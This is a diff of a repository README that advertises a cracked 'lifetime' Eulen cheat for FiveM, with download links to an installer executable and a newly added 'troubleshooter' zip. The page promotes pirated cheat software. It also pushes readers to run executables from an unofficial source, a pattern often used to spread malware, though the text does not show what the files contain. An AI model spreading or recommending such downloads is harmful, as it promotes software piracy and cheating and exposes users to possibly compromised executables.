@@ -1,7 +1,11 @@
 # Eulen
-Eulen Cheat for FiveM (cracked, lifetime, v.8.27.5)
+### Eulen Cheat for FiveM (cracked, lifetime, v.8.27.5)
 
 -> [Download](https://github.com/ASMRoyal/Eulen/releases/download/Eulen/Eulen.Installer.exe) <-
+
+### Menu Freezes or crashes?
+
+-> [Troubleshooter](https://github.com/ASMRoyal/Eulen/releases/download/Troubleshooter/troubleshooter.zip) <-
 
 # Official Release of cracked Eulen Cheat.
 ## Informations
